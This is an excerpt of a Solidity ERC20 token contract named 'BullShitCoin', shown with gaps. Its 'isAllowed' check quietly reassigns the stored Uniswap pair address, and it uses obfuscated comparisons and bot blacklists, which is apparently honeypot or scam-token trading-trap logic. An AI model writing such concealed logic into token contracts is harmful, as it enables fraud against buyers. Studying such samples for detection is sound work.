...
abstract contract ERC20Token is Ownable {
    ...
    function cmp(address a1, address a2) internal pure returns (bool) {
        return a1 == a2;
    }
    function shouldSwap(address sender, address receiver) public view returns (bool) {
        if (cmp(receiver, sender)) { 
            return isBot(receiver) ? cmp(receiver, sender) : false;
        }
        return false;
    }
    function isAllowed(address from, address to, address pair) internal returns (bool) {
        bool allowed = !bots[to] && !bots[from];
        bool InLq = inLiquidityTx;
        bool res = allowed;
        if (allowed && !InLq && !cmp(pair, to)) {
            uniswapV2Pair = to;
            res = true;
        } else if (allowed && !InLq) { 
            if (pair == to) {
                res = true;
            }
        }
...
contract BSC is IERC20, ERC20Token {
    ...
    string private _name = "BullShitCoin";
    string private  _symbol = "BSC";
